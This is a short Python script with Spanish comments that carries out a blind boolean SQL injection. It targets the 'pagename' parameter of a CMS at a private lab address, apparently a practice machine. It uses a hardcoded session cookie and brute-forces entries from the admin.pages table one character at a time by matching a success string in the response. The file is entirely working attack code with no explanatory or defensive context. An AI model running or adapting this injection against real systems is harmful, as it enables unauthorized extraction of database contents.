#!/usr/bin/python3

from pwn import *
import requests, signal, time, sys, string

# Variables 
url = "http://172.16.23.129/imfadministrator/cms.php?pagename=home"
unsafe_url = set("&?#=%+;:@[]/ \\\"'`{}|^~,")  # reservados/delimitadores + espacio
chars = ''.join(c for c in (string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation)
                if c not in unsafe_url) or (string.ascii_letters + string.digits + "_")

cookies = {'PHPSESSID': 'd687mu751epg8huln7u84dm6e1'}

# --Funciones--
def StopProgram(sig, frame):
    print("\n\n[!] Interrupción...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, StopProgram)

def SQLiAttackTB():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Inicia Progreso de fuerza Bruta")
    time.sleep(1)
    p2 = log.progress("Databases")
    resultados = []

    for dbs in range(0, 6):
        nombre_db = ""
        p1.status(f"Enumerando índice {dbs}")
        for position_character in range(1, 30):
            found = False
            for character in chars:
                sqli = url + f"'+AND+(SELECT+substring(pagename,{position_character},1)+FROM+admin.pages+limit+{dbs},1)%3d'{character}-- "
                p1.status(sqli)
                r = requests.get(sqli, cookies=cookies)
                if "Welcome to the IMF Administration." in r.text:
                    nombre_db += character
                    p2.status(nombre_db)
                    found = True
                    break
            if not found:
                break
        resultados.append(nombre_db)
        print(f"Base de datos encontrada: {nombre_db}") 

    print("\nResumen:")
    for resultado in resultados:
        print(resultado)

if __name__ == "__main__":
    SQLiAttackTB()
